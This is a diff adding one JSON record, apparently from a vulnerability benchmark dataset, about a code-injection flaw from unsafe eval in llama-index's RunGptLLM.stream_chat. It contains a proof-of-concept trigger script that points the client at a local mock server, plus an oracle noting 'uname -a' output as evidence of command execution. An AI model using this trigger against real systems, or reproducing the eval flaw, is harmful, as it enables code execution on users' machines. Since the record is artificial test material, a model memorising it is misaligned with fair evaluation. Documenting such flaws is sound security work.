@@ -1,0 +1,15 @@
+{
+  "file_id": "273_llama-index_huntr_1a204520-598a-434e-b13d-0d34f2a5ddc1",
+  "numeric_id": "273",
+  "library_hint": "llama-index",
+  "source": "huntr",
+  "title": "Command injection in RunGptLLM due to unsafe use of eval",
+  "cve": "N/A",
+  "cwe": "CWE-94: Improper Control of Generation of Code ('Code Injection')",
+  "library": "llama-index",
+  "affected_version": "prior to fix in PR #11347",
+  "vulnerable_function": "RunGptLLM.stream_chat",
+  "triggerability": "indirect",
+  "trigger_payload": "from llama_index.llms.rungpt import RunGptLLM\n\nclass Exploit:\n    def __init__(self):\n        # Initialize with the mock SSE server URL\n        self.run_gpt_llm = RunGptLLM(endpoint=\"http://localhost:5000\")\n    \n    def exploit(self):\n        # This method simulates interacting with the stream_chat to process the mal\n        messages = [] # Assuming an empty message list for simplicity\n        generator = self.run_gpt_llm.stream_chat(messages)\n        try:\n            for response in generator:\n                print(\"Received a response: \", response)\n        except Exception as e:\n            print(\"Error processing the stream: \", e)\n\n# Simulate executing the exploit\nif __name__ == \"__main__\":\n    exploit = Exploit()\n    exploit.exploit()",
+  "oracle": "Command execution on the client machine (e.g., output of 'uname -a') is visible in the console before the error message"
+}
